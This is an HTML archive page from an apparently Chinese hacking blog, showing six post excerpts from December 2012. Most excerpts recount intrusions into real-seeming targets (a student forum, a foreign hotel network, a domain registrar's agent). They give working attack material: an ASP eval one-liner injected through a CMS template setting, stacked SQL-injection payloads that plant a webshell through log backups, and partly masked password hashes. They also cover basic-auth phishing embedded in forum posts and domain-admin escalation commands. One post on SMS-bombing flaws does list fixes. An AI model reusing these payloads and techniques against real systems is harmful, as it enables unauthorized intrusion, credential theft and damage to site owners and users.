@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Archives: 2012/12 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+<main class="content" role="main">
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-17T22:28:56.000Z" itemprop="datePublished">
+          2012-12-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/956.seo/">马克思cms后台拿webshell方法</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        马克思cms后台拿webshell方法  这个方法容易引起出错，如果用这个方法建议用最快的速度给恢复。  系统-》站点配置-》模板与路径设置-》模板文件所在文件夹   html  改为     html&quot;%&gt;&lt;%eval request(&quot;123&quot;)%&gt;&lt;%’ 
+
+点 确认更新得到一句话连接地址：http://www.fst0316.com/max/inc/config.asp
+      
+      </p>
+      
+      <p>
+          <a href="/956.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-13T19:05:04.000Z" itemprop="datePublished">
+          2012-12-14
+      </time>
+    
+    
+    | 
+    <a href='/tag/钓鱼/'>钓鱼</a>,
+    
+    <a href='/tag/爆破/'>爆破</a>,
+    
+    <a href='/tag/短信轰炸/'>短信轰炸</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/955.seo/">短信平台相关常见问题整理</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>在近期的渗透测试项目中，在短信平台相关功能都出现了一些问题，现对渗透过程中发现，及wooyun上出现的相关短信平台的几类问题做个整理。</p>  <p>一、短信发送无频率限制</p>  <p>通过wooyun上搜索可见，该类漏洞是最为常见的。</p>  <p>漏洞相关链接：</p>  <p>万网发验证信息，无限时。无限次数形成<a href="http://ha.cker.in/tag/短信轰炸" target="_blank">短信轰炸</a> <a href="http://www.wooyun.org/bugs/wooyun-2010-07592">http://www.wooyun.org/bugs/wooyun-2010-07592</a>    <br />盛大网络短信ddos攻击漏洞 <a href="http://www.wooyun.org/bugs/wooyun-2010-02773">http://www.wooyun.org/bugs/wooyun-2010-02773</a></p>  <p>漏洞成因： 对发送信息功能调用未做任何限制</p>  <p>漏洞危害：</p>  <p>1、可针对某用户短时间内发送大量垃圾短信，造成短信轰炸攻击；</p>  <p>2、对于企业，每发一条短信，都是需要向运营商交付一些费用，尽管比个人用户费用低，但是一旦被恶意利用大量发送后，造成较大的直接经济损失。</p>  <p>漏洞修补：</p>  <p>1、限定同一手机号在一时间段内发送次数，如每分钟发送1次，具体落实需结合用户体验综合考虑；</p>  <p>2、使用强壮的验证码机制。</p>  <p>补充：曾在测试中发现某客户的验证码有效期为2分钟，即2分钟内无需修改验证码直接成功回放请求包，同样可造成短信炸弹工具。因此，务必保证验证码的强壮型，并采用一次一用机制。</p>  <p>二、短信发送内容来自客户端</p>  <p>这类漏洞一般不直观，直接由用户输入来定义短信内容的问题确实没遇到过，这里的漏洞是把短信内容放在的POST表单中，从页面上无法发现，需要抓包分析才能看到。</p>  <p>相关漏洞：</p>  <p>（知道这漏洞是哪家的同学也请嘘，咱不讨论它是谁的，另漏洞已经修补了）</p>  <p>某系统可以在WEB页面上选择手机品牌和型号，填入手机号码可发送下载地址至手机，具体操作界面如下图：</p>  <p><a href="http://img.cker.in/9dedeb5ea29c_9BB4/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/9dedeb5ea29c_9BB4/clip_image001_thumb.jpg" width="593" height="327" /></a></p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/955.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-12T17:08:42.000Z" itemprop="datePublished">
+          2012-12-13
+      </time>
+    
+    
+    | 
+    <a href='/tag/代码执行/'>代码执行</a>,
+    
+    <a href='/tag/cacti/'>cacti</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/954.seo/">沦陷学生之家，一次漂亮的渗透与源码分析</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><p>某某河畔是郫县男子dota技术专修学校里各种骚男闷女无聊打发时间的地方。使用的是pw+php bluster搭建的。负责维护的童鞋几乎把pw的基础代码都改写过了，代码安全性还是比较高的。但是这次无情的被沦陷了。</p>  <p>详细说明：</p>  <p>1. 沦陷备份服务器   <br />各种弱口令+cacti拿shell    <br />访问<a href="http://xxx.xxxhome.net，使用弱密码admin/admin进入管理页面">http://xxx.xxxhome.net，使用弱密码admin/admin进入管理页面</a>    <br />上网找了几个cacti的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，都没能利用上。于是自己开始下了一套cacti开始折磨。    <br />看到install目录下有几个.php文件，顿时眼前一亮</p>  <p><a href="http://img.cker.in/527aebd1fe39_801B/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/527aebd1fe39_801B/clip_image001_thumb.jpg" width="594" height="273" /></a></p>  <p>把cacti的日志文件设置为这几个文件中的一个，重新登陆一下，可以看到日志确实被写进去了，那么只要想办法产生一些&lt;?php这样的日志，就能执行代码了。最直接的想法那就是用&lt;?php这样的用户去登录，有兴趣的同学可以继续深入，我反正没成功，cacti把尖括号神马的都过滤掉了。这条路暂时封死了。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/954.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-10T00:14:53.000Z" itemprop="datePublished">
+          2012-12-10
+      </time>
+    
+    
+    | 
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/钓鱼/'>钓鱼</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/953.seo/">当Discuz!遇上xsser.me：基础认证钓鱼</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>简要描述：</p>  <p>利用的是xsser.me的基础认证<a href="http://ha.cker.in/tag/钓鱼" target="_blank">钓鱼</a>，并成功钓到用户数据</p>  <p>详细说明：</p>  <p>当在Discuz中回帖，插入一张很奇葩的图片时，可能就会导致用户被盗号。</p>  <p><a href="http://xsser.me/authtest.php?id=Ayuk1y&amp;info=Please+Login+In++@360.cn">http://xsser.me/authtest.php?id=Ayuk1y&amp;info=Please+Login+In++@360.cn</a>   <br />例如上面那个地址，可以用图片来引用之，然后回帖，当用户看到这张图片的时候，就会触发提示登陆框。    <br />这个地址是一个401头    <br />HTTP/1.1 401 Unauthorized    <br />当输入密码后，会重定向到收集数据的页面，接着，你们密码就被盗了。    <br />我为什么认为这个是一个漏洞：    <br />1、用户网站大多都是提醒用户不要再站外输入自己的账号密码，但是，现在将代码插入到网站内部，用户有认为这是在网站内部，所以就输入了自己的密码。    <br />2、经过试验，成功钓到了用户的数据    <br />3、不仅仅是Discuz，需要网站都支持引用一张网络图片，并没有对图片的HTTP头进行检验。基础认证钓鱼很容易蔓延开来。。    <br />4、之前的钓鱼过程是：黑客设立钓鱼页——通过短信息等传播这个地址——用户访问——用户受骗    <br />而现在是：黑客在帖子中插入钓鱼信息——用户访问——用户受骗    <br />显然，就少了一个非常繁琐的步骤。    <br />例如，在一个论坛中，我将那个图片插在签名中，然后几乎每个帖子都去回复，然后，用户基本上就是去到哪里都能看到我的框框。。。。-,-然后后果你猜？！    <br />（部分浏览器不支持）</p>  <p>漏洞证明：</p>  <p>以360论坛和吾爱破解论坛做了个试验。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/953.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">
+          2012-12-09
+      </time>
+    
+    
+    | 
+    <a href='/tag/Webshell/'>Webshell</a>,
+    
+    <a href='/tag/内网渗透/'>内网渗透</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/952.seo/">对国外某hotel的内网域渗透案例</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>目录</p>  <p>1网站初探</p>  <p>2通过Sql注入获取webshell</p>  <p>2.1通过Log备份获得webshell</p>  <p>3权限提升</p>  <p>3.1查看服务器基本信息</p>  <p>3.2渗透A域中的机器</p>  <p>4渗透其他域下机器</p>  <p>4.1轻松搞定WORKGROUP下机器</p>  <p>4.2渗透B域下的机器</p>  <p>4.3一波未平一波又起</p>  <p>5截稿</p>  <p>本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.</p>  <p>网站初探</p>  <p>本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.<ins>(</ins><ins>开启</ins><ins>vpn,</ins><ins>跳到肉鸡</ins><ins>,</ins><ins>嘞次购</ins><ins>.)</ins>    <br />首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.    <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/%E5%9B%BE%E7%89%871.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="live http header" border="0" alt="clip_image001" src="http://img.cker.in/hotel_13F2D/clip_image001.jpg" width="570" height="370" /></a></p>  <p>通过Sql注入获取<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a></p>  <p>这里漏洞修补了,就不截图了,直接给出方法:   <br /><a href="http://www.pentesting.cc/test.aspx?id=1">http://www.pentesting.cc/test.aspx?id=1</a> AND 1 IN (select @@version)–返回    <br />Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</p>  <p>通过Log备份获得webshell   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1440">           <p>test.aspx?id=1;alter/<strong>/database/</strong>/[CRSHGC]/<strong>/set/</strong>/recovery/<strong>/full–</p>            <p>test.aspx?id=1;declare/</strong>/@d/<strong>/nvarchar(4000)/</strong>/select/<strong>/@d%3D0x640062006200610063006B00/</strong>/backup/<strong>/database/</strong>/[CRSHGC]/<strong>/to/</strong>/disk%3D@d/<strong>/with/</strong>/init–</p>            <p>test.aspx?id=1;create/<strong>/table/</strong>/<a href="[a]/**/image">pg</a>–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%3D0x640062006200610063006B00/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>            <p>test.aspx?id=1;insert/</strong>/into/<strong>/<a href="[a]">pg</a>/</strong>/values(0x3C25457865637574652872657175657374282272222929253E)–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>         </td>       </tr>     </tbody></table> </p>  <p>权限提升</p>  <p>先query user看看有在线的木有，如图：   <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/queryuser.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="queryuser" border="0" alt="clip_image002" src="http://img.cker.in/hotel_13F2D/clip_image002.jpg" width="570" height="125" /></a>    <br />如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    <br />在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀<ins>(</ins><ins>这里</ins><ins>tasklist</ins><ins>、</ins><ins>net start</ins><ins>、</ins><ins>netstat -an</ins><ins>一下木杀毒，此篇就不扯这了</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::</p>            <p>ACC*</strong>ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0::: </p>            <p>gr<strong><em>ral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B::: </p>            <p>br</em></strong>ez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16::: </p>            <p>C<strong><em>nt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89::: </p>            <p>hm</em></strong>o:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800::: </p>            <p>……</p>         </td>       </tr>     </tbody></table> </p>  <p>查看服务器基本信息</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration</p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : host1</p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : A.COM</p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Unknown</p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No</p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No</p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : A.COM</p>            <p>Ethernet adapter Local Area Connection 2:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.205</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.202</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.195</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.103</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.13</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.65</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>            <p>Ethernet adapter Local Area Connection:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.84</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.83</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.82</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.81</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.80</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.49</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>         </td>       </tr>     </tbody></table> </p>  <p>从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain</p>            <p>——————————————————————————-</p>            <p>B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>WORKGROUP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>渗透A域中的机器</p>  <p>查看A域中都有哪些域成员。<ins>（</ins><ins>IP</ins><ins>直接</ins><ins>ping</ins><ins>下就知道，记录下</ins><ins>TTL</ins><ins>值，猜测系统版本）</ins>    <br />dsquery server -o rdn <ins>(</ins><ins>不清楚的可以</ins><ins>nslookup A.com</ins><ins>或者</ins><ins>net group &quot;domain controllers&quot;</ins><ins>，这些命令在域环境下执行</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>//查找当前域中所有的域控制器</p>            <p>HGhost&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.212 TTL=128</p>            <p>host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.205 TTL=128 本机</p>            <p>HGhost2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.213 TTL=128</p>            <p>host1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //本机</p>         </td>       </tr>     </tbody></table> </p>  <p>可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &quot;domain admins&quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/952.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-12-07T06:42:03.000Z" itemprop="datePublished">
+          2012-12-07
+      </time>
+    
+    
+    | 
+    <a href='/tag/神器/'>神器</a>,
+    
+    <a href='/tag/ARP/'>ARP</a>,
+    
+    <a href='/tag/劫持/'>劫持</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/951.seo/">深夜劫持雾隐技术小组</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>作者:Noseay|Roc@哈客部落   <br />粉丿丶兜兜    <br />转载请注明作者以及出处,谢谢</p>  <p>下午看见大牛<a href="http://ha.cker.in/tag/ARP" target="_blank">ARP</a>雾隐技术小组在群发,.所以手痒,打算被ARP的时候去欺骗一下万网的蝈蝈,电话过去,想说域名被人劫持了,喊他重置下密码,谁知道问这问那的,最后却告诉我页面恢复了..无奈之下,万网的蝈蝈告诉了我代理商的电话和手机,百度之    <br />发现了该代理商的网站,用遇见蝈做的<a href="http://ha.cker.in/tag/神器" target="_blank">神器</a>扫了下</p>  <p><a href="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image001_thumb.png" width="574" height="407" /></a></p>  <p>发现旁站挺多的,就随便拿个站下手吧,果断默认密码,上了个一句话</p>  <p><a href="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image002.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/ae6251aa0e6e_13EAF/clip_image002_thumb.png" width="574" height="387" /></a></p>  <p>在上一个webshell,提权ing….   <br />拿下服务器后,把代理商的站脱了个光都没发现里面该黑阔注册的域名    <br />无奈之下,只有在服务器里乱逛,突然想到whois信息里的dns是NS1.xxxxxx.COM    <br />看了下服务器里,也有这个站xx.xxxxxx.com    <br />首页看了一下数据库、发现有好多关于域名的！</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/951.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <nav class="pagination" role="pagination">
+    <a class="newer-posts" href="/archives/2012/12/">← Newer Posts</a>
+    <span class="page-number">Page 2 of 3</span>
+    <a class="older-posts" href="/archives/2012/12/page/3/">Older Posts →</a>
+  </nav>
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
